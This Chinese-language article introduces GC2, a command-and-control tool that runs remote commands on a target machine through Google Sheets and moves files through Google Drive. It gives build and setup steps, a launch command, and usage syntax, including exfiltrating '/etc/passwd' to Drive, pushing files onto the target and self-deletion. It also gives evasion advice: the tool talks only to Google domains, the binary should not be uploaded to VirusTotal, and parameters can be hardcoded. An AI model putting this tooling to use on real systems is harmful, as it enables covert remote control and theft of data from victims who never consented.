## 关于GC2

GC2是一款功能强大的命令控制应用工具，该工具将允许广大安全研究人员或渗透测试人员使用Google
Sheet来在目标设备上执行远程控制命令，并使用Google Drive来提取目标设备中的敏感数据。

值得一提的是，该工具可以直接提供命令控制服务，而无需进行其他额外的安装和配置，因此可以大大提高红队渗透活动的效率。除此之外，这款工具只能跟Google的域名（*.google.com）交互，因此也增加了检测GC2的难度。

请注意：千万不要将已编译好的代码上传到VirusTotal上！

## 功能介绍

使用Google Sheet作为终端窗口来实现命令控制与命令执行。

使用Google Drive向目标主机传输和下载文件。

使用Google Drive从目标主机中提取数据。

退出执行。

## 工具运行流程

![](https://image.3001.net/images/20211116/1637057272_619382f84a2b61a107ea0.png!small)

## 工具安装&配置

第一步：使用下列命令将该项目源码克隆至本地，然后构建项目代码：

    
    
    git clone https://github.com/looCiprian/GC2-sheet
    
    cd GC2-sheet
    
    go build gc2-sheet.go

第二步：创建一个新的Google “服务账号”，此时我们需要点击【[
_这里_](https://console.cloud.google.com/)】来创建该服务账号所需的.json密钥文件。

第三步：启用Google Sheet API和Google Drive API。

 **启用Google Sheet API：** 【[
_传送门_](https://developers.google.com/drive/api/v3/enable-drive-api)】

 **启用Google Drive API：** 【[
_传送门_](https://developers.google.com/sheets/api/quickstart/go)】

第四步：配置Google Sheet和Google Drive。创建一个新的Google
Sheet，并添加服务账号至spreadsheet的Editor组：

![](https://image.3001.net/images/20211116/1637057296_61938310ef6b7619ac685.png!small)

创建一个新的Google Drive文件夹，并将服务账号添加进这个文件夹的Editor组中：

![](https://image.3001.net/images/20211116/1637057305_61938319289728a767f51.png!small)

第五步：使用下列命令启动GC2：

    
    
    gc2-sheet --key <GCP service account credential file .JSON > --sheet <Google sheet ID> --drive <Google drive ID>

注意事项：你可以将参数以硬编码的形式写入进代码中，并只将可执行程序上传至目标设备上。

## 工具使用

### 命令执行

GC2每五秒会向spreadsheet发送一次请求，并检查是否存在未执行的新命令。命令必须插入值请求中的“A”字段记录中，而命令输出结果将存储在“B”字段中。

### 数据提取

我们可以使用指定的命令来在目标设备上执行文件上传或下载任务：

    
    
    From Target to Google Drive
    
    upload;<remote path>
    
    Example:
    
    upload;/etc/passwd

### 下载文件

我们可以使用指定的命令来在目标设备上执行文件上传或下载任务：

    
    
    From Google Drive to Target
    
    download;<google drive file id>;<remote path>
    
    Example:
    
    download;<file ID>;/home/user/downloaded.txt

### 退出执行

通过发送“exit”命令，GC2将会从目标设备上远程删除自身代码，并终止自身进程的运行。注意，如果开启进程时使用了符号链接，那么命令执行结果可能会是符号链接或路径所指向的目标，从而导致删除错误的目标。

## 项目地址

 **GC2：** 【[ _GitHub传送门_](https://github.com/looCiprian/GC2-sheet)】

## 参考资料

> [ _https://console.cloud.google.com/_](https://console.cloud.google.com/)
>
> [ _https://developers.google.com/drive/api/v3/enable-drive-> api_](https://developers.google.com/drive/api/v3/enable-drive-api)
>
> [
> _https://developers.google.com/sheets/api/quickstart/go﻿_](https://developers.google.com/sheets/api/quickstart/go)

